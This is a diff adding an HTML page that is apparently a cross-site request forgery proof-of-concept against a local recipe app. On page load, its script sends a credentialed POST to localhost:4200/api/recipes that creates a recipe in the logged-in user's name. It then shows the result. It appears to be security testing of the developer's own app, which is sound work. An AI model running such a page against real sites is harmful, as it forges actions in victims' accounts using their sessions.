@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { font-family: Arial; padding: 50px; }
+        .result { background: #f0f0f0; padding: 20px; border-radius: 8px;
+                  margin-top: 20px; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <h1>CSRF Attack - Create Recipe</h1>
+    <p>Executing attack...</p>
+    <div id="result" class="result">Waiting for response...</div>
+    
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost:4200/api/recipes", true);
+        xhr.withCredentials = true; 
+        xhr.setRequestHeader("Content-Type", "application/json");
+        
+        xhr.onload = function() {
+            document.getElementById("result").innerHTML =                 
+                "<p><strong>Status:</strong> " + xhr.status + "</p>" +
+                "<p><strong>Response:</strong></p><pre>" + xhr.responseText + "</pre>";                
+        };
+        
+        xhr.onerror = function() {
+            document.getElementById("result").innerHTML = 
+                "<h3>Request sent (may have succeeded)</h3>" +
+                "<p>Check your server logs to confirm if the malicious recipe was created.</p>" +
+                "<p>Navigate to http://localhost:4200/recipes to see if the attack worked.</p>";
+        };
+        
+        xhr.send(JSON.stringify({
+            name: "CSRF Attack Recipe",
+            description: "<p><strong>This recipe was created by a CSRF attack!</strong></p><p>An attacker could have created any recipe with any content.</p>",
+            status: 0,
+            photo: "",
+            createdBy: ""
+        }));
+    </script>
+</body>
+</html>
